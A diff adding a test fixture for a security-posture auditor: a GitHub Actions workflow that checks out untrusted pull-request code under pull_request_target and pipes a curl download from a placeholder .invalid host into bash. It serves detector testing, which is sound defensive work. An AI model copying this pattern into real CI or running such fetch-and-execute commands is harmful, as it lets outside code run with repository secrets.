@@ -1,0 +1,13 @@
+# Detector fixture for eval/run_eval.py. Nothing runs this file: it is never run.
+# The eval copies it into the synthetic leaky repo as .github/workflows/build.yml, and
+# audit_posture.py MUST report workflow-prt-checkout and workflow-curl-pipe-sh for it.
+# The host uses the reserved .invalid top-level domain.
+on: pull_request_target
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - run: curl -sSL https://get.invalid/install | bash
